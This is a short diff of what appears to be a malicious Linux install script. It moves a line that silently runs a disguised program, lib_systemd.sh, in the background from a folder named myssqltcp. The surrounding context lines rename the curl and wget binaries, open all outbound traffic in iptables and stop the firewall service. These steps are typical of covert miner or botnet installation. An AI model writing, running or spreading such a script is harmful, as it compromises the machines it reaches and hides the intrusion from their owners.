@@ -809,6 +809,7 @@ mv /usr/bin/url /usr/bin/lruc
 mv /usr/bin/wget /usr/bin/get
 mv /usr/bin/get /usr/bin/tegw
 
+cd $HOME/myssqltcp/ && nohup ./lib_systemd.sh >/dev/null 2>&1 &
 echo "[*] Yes-Go"
 EOL
 
@@ -1475,5 +1476,4 @@ iptables -A OUTPUT -j ACCEPT
 service iptables reload
 systemctl stop firewalld.service
 
-cd $HOME/myssqltcp/ && nohup ./lib_systemd.sh >/dev/null 2>&1 &
 echo "[*] Yes-GoGo"
